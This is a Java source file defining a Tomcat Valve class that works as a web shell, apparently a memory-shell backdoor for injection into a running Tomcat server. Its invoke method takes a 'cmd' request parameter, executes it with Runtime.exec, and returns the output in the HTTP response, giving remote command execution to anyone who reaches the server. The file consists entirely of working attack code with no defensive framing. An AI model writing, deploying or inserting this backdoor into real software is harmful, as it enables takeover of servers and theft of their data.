import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class Valveimpl extends ValveBase {
    @Override
    public Valve getNext() {
        return null;
    }

    @Override
    public void setNext(Valve valve) {

    }

    @Override
    public void backgroundProcess() {

    }

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        if (cmd != null && !cmd.equals("")) {
            Runtime runtime = Runtime.getRuntime();
            InputStream inputStream = runtime.exec(cmd).getInputStream();
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            byte[] bytes = new byte[1024];
            int a = -1;
            while ((a = inputStream.read(bytes)) != -1) {
                outputStream.write(bytes, 0, a);
            }
            response.getWriter().println(new String(outputStream.toByteArray()));
        } else {
            response.getWriter().println(">||<");
        }
    }
    @Override
    public boolean isAsyncSupported() {
        return false;
    }
}